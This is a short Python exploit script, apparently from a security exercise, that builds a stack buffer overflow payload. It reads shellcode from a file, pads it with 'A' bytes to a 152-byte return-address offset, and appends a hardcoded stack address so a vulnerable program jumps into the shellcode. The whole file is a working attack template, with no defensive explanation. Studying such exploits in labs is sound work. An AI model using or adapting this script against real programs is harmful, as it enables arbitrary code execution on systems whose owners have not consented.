#!/usr/bin/env python3

import sys

sc = open(sys.argv[1], "rb")

payload = sc.read()
print('Shellcode length %d' % len(payload), file=sys.stderr)

retaddr_off = 152   # Difference between buf1 base address and $rip

# 0x7fffffffdbd0
buffer_addr = b'\xd0\xdb\xff\xff\xff\x7f' # you need to find

extra_bytes = retaddr_off - len(payload)

payload = payload + b'A' * extra_bytes + buffer_addr

print("Press enter when ready...", file=sys.stderr)
sys.stdin.buffer.readline()

sys.stdout.buffer.write(payload)

